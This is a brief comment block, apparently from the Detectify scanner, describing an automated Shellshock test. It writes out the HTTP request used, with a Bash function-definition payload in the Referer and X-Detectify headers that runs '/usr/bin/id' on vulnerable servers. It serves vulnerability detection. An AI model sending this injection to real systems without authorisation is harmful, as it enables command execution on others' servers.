...
# @detectify
#
# Our automatic test will iterate all below specified URLs until
# it finds a vulnerable end-point where it will inject the following  # payload:
# https://docs.google.com/document/d/1vN2QOG2OZIAHGXDmd5wB8FPi-Hin2GaIlWRJ0RYkTbA/preview?sle=true
# GET /$LIST HTTP/1.1
# Host: example.com
# User-Agent: https://shellshock.detectify.com/
# Accept: */*
# Referer: () { :;}; echo; /usr/bin/id
# X-Detectify: () { :;}; echo; /usr/bin/id
